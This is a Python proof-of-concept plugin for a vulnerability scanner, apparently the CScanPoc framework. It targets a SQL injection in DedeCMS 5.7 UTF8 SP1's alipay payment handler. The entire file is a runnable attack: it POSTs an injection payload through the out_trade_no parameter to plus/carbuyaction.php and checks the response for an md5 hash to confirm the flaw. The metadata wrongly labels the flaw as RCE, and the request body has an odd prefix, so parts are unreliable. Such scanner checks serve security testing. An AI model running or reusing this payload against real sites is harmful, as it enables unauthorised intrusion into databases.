# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'DedeCMS_0015'  # 平台漏洞编号，留空
    name = '织梦CMS-V5.7-UTF8-SP1 sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-06-06'  # 漏洞公布时间
    desc = '''
        织梦CMS 在/include/payment/alipay.php(lines:125-161) 过滤参数不严谨，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://www.sitedirsec.com/exploit-1800.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
    product_version = '织梦CMS-V5.7-UTF8-SP1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7002ee2c-51ab-42bf-8a57-d8aab29cf50d'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-09'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/DedeCMS-V5.7-UTF8-SP1/uploads/plus/carbuyaction.php'
            data = "post_data:dopost=return&code=alipay&out_trade_no=M1T1RN1' or concat(char(@`'`),(SELECT md5(c)))#'"
            url = self.target + payload
            r = requests.post(url, data=data)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
